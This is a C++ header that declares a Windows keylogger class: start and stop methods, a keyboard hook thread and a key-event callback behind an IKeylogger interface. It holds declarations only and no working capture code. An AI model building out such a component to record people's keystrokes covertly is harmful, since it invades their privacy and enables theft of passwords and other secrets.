#pragma once
#include "interfaces/IKeylogger.hpp"
#include <windows.h>
#include <thread>
#include <atomic>

namespace platform {
namespace windows_os {

    class WindowsKeylogger : public interfaces::IKeylogger {
    public:
        WindowsKeylogger();
        ~WindowsKeylogger();

        common::Result<common::Ok> start(std::function<void(const interfaces::KeyEvent&)> callback) override;
        void stop() override;
        bool is_active() const override;

    private:
        void hook_thread();

        std::atomic<bool> running_{false};
        std::thread thread_;
        std::function<void(const interfaces::KeyEvent&)> callback_;
        DWORD thread_id_ = 0;
    };

} // namespace windows_os
} // namespace platform
